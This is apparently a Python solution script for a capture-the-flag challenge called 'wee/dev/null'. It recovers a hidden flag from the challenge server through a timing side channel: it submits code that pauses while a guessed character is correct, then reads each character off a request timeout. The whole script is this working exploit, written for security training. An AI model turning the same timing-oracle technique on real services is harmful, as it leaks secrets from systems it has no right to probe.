#!/usr/bin/env python3
import requests
from _env import HOST
import sys
sys.path.append("..") # Adds higher directory to python modules path.
from flags import DEV_NULL

print("""
[MISC] - Hard
This challenge is all about wee/dev/null.
Huh.. How would we ever get the flags out if we can't print?
Should we break out of Node?
Well while this might be an option,,, it's definitely not the one we are looking for as part of a Junior Challenge.

Instead, we can use a nice timing attack with self-made timing code:
in case we find the correct flag, pause() and/or loop.

For speedup, we can use binary search, however it's not needed to solve the challenge.

The flag will be {}

As part of the exploit, we (slowly) get back the Flag here:
""".format(DEV_NULL))


def try_at(idx, char):
    code = '''
    while charAt(DEV_NULL, {}) == "{}" do
        pause(1)
    end
    '''.format(idx, char.replace('"', '\"'))  # Make sure we also see quotes by replacing
    try:
        requests.post("http://{}/wee/dev/null".format(HOST), json={"code": code}, timeout=3)
        return False
    except requests.Timeout as ex:
        return True


def find_char_at(idx):
    """
    Timing attack on all chars from 20 to 127
    :param idx: the flag param index to probe
    :return: the char we found
    """
    for char_i in range(20, 128):
        if try_at(idx, chr(char_i)):
            return chr(char_i)

    raise Exception("Could not find a valid letter.")


solution = ""
while not solution or solution[-1] != "}":  # Until End of Flags
    next_char = find_char_at(len(solution))
    solution += next_char
    print(next_char)
